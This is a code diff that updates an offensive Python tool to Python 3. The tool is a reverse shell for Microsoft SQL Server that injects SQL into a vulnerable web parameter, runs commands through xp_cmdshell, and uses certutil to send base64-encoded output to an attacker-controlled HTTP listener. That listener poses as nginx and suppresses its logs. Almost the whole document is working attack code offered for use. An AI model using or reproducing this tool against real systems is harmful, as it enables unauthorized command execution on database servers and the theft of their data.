@@ -1,61 +1,57 @@
+
+'''
+Description: Reverse MSSQL shell through xp_cmdshell + certutil for exfiltration (now in py3)
+Author: @xassiz
+
+Update python3
+Author: ksaadDE (python3 update)
+
+inner-working:
+1. launch websrv
+2. waits 4 command
+3. if you send command (e.g. dir) it will use xp_cmdshell on mssql server and certutil to make a http request to our websrv
+4. decode b64 and utf8 (ascii works too), HTTP-GET result on our websrv (by certutils).
+5. print the result
+6. 302 to http://127.0.0.1
+7. go to 2
+'''
+
 import sys
 import requests
 import threading
-import HTMLParser
-from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import logging
+import base64
+import html
 
-'''
-Description: Reverse MSSQL shell through xp_cmdshell + certutil for exfiltration
-'''
+gotResult  = False
+target_url = "http://targetip/xxx.asp"
+local_port = 4444
+local_url  = "http://localip:{}/special/".format(local_port)
 
-
-query_id   = 0
-target_url = "http://target/vulnerable.asp"
-local_url  = "http://attacker/"
-local_port = 80
-
-
-'''
-Decoding functions
-'''
-b64_padding = lambda x: x.ljust(len(x) + (4 - len(x) % 4), '=')
-
-def base64_dec(x):
-    try:
-        res = b64_padding(x).decode('base64')
-    except:
-        # Command output got truncated
-        if len(x)%4 > 0:
-            x = x[:-(len(x)%4)]
-        res = x.decode('base64')
-    return res
-
-def decode(data):
-    parser = HTMLParser.HTMLParser()
-    try:
-        # We don't like Unicode strings, do we?
-        html = base64_dec(data).replace(chr(0),'')
-    except:
-        return '[-] decoding error'
-    return parser.unescape(html)
+# rewrite of lamda func of original code
+def b64pad (x):
+   return x.ljust(len(x) + (4-len(x) % 4), '=')
 
 
-'''
-Get command from stdin
-'''
+def base64_dec (x):
+   x = x.replace("/","")        # replace beginning / with ""
+   x = b64pad (x)               # b64 paddings (the = at the end)
+   x = x.replace(chr(0),'')     # replaces the 0x00 chrs
+   x = base64.b64decode(x)      # decodes the b64
+   x = str(x.decode('utf-8'))   # decodes to utf8
+   return html.unescape(x)      # uses the HTML library to ensure that &gt, &#62 etc is correctly converted (seems to be buggy :( )
+
 def get_command():
     try:
-        cmd = raw_input(':\> ')
+        cmd = input(':\> ')
         t = threading.Thread(target=send_command, args=(cmd,))
         t.start()
-    except:
+    except Exception as e:
+        print(e)
         sys.exit(0)
 
-
-'''
-Create payload and send command: adapt this function to your needs
-'''
-def send_command(cmd):
+def send_command (cmd):
     global target_url, local_url
 
     payload  = "';"
@@ -69,68 +65,75 @@ def send_command(cmd):
 
     user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
     h = {'User-Agent':user_agent}
-    
+
     # Customize from here
     p = {
-          'param1':'foo',
-          'param2':'bar',
-          'vulnerable_param':payload % (cmd, local_url)
+          '--> VULN FORM VAR <--':payload % (cmd, local_url)
         }
 
-    requests.get(target_url, headers=h, params=p)
+    requests.get (target_url, headers=h, params=p)
 
 
 
-'''
-Custom HTTPServer
-'''
-class MyServer(HTTPServer):
-    def server_activate(self):
-        # get first command
-        get_command()
-        HTTPServer.server_activate(self)
+# stolen from https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7
+class S(BaseHTTPRequestHandler):
+    server_version = "nginx" # override server_version
 
-class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
-    def log_request(self, *args, **kwargs):
-        return
+    # epic forwarding of non /special route access (can be tracked using f12 in browser or curl headers
+    def sendDefaultHeaders (self,):
+        self.send_response (301)
+        self.send_header ('Content-type', 'text/html')
+        self.send_header ('Location', 'http://127.0.0.1')
+        self.end_headers ()
 
-    def log_message(self, *args, **kwargs):
-        return
+    # nginx version_string override - do not remove
+    def version_string (self,):
+        return "nginx"
+    
+    # disabled logging - do not remove
+    def log_message(self, format, *args):
+        pass
 
+    def _set_response(self):
+        self.sendDefaultHeaders ()
+        pass
+
+    # process the incoming get requests
     def do_GET(self):
-        global query_id
-        self.send_error(404)
-        
-        # Certutil sends 2 requets each time
-        if query_id % 2 == 0:
-            output = self.path
+        global gotResult
 
-            # if command output, decode it!
-            if output != '/':
-                print decode(output[1:])
+        # select /special route
+        if len(self.path) > 0 and self.path.startswith("/special/"):
 
-            # get next command
-            get_command()
+            # only get first result, speeds up everything! (old code waited for the second result using queryid mod 2)
+            if not gotResult:
+                print (base64_dec (self.path.replace("/special/","")))
 
-        query_id += 1
+            # invert the bool
+            gotResult = not gotResult
 
+        # 301 to 127.0.0.1
+        self.sendDefaultHeaders ()
+        pass
 
-'''
-Main
-'''
-if __name__ == '__main__':
-    # Fake server behaviour
-    handler = SimpleHTTPRequestHandler
-    handler.server_version = 'nginx'
-    handler.sys_version = ''
-    handler.error_message_format = 'not found'
-    
-    # Add SSL support if you wanna be a ninja!
-    httpd = MyServer(('0.0.0.0', local_port), handler)
-    
+    def do_POST(self):
+        pass
+
+def run(port=4444, server_class=HTTPServer, handler_class=S):
+    logging.basicConfig(level=logging.INFO)
+    server_address = ('0.0.0.0', port) # run public
+    httpd = server_class(server_address, handler_class)
+    logging.info('Starting httpd...\n')
     try:
         httpd.serve_forever()
     except KeyboardInterrupt:
         pass
     httpd.server_close()
+    logging.info('Stopping httpd...\n')
 
+if __name__ == '__main__':
+    from sys import argv
+    t=threading.Thread(target=run, args=(local_port,))
+    t.start ()
+    while True:
+    	get_command ()
